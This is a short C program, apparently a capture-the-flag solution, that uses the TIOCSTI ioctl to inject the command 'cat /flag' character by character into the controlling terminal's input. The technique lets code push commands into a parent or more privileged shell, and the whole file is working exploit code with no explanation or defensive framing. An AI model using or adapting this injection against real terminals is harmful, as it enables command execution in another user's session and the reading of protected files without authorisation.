#include <sys/ioctl.h>
#include <string.h>

int main() {
    const char* c = "cat /flag\n";
    for(unsigned int i = 0; i < strlen(c); i++) {
        ioctl(0, TIOCSTI, &c[i]);
    }
    return 0;
}
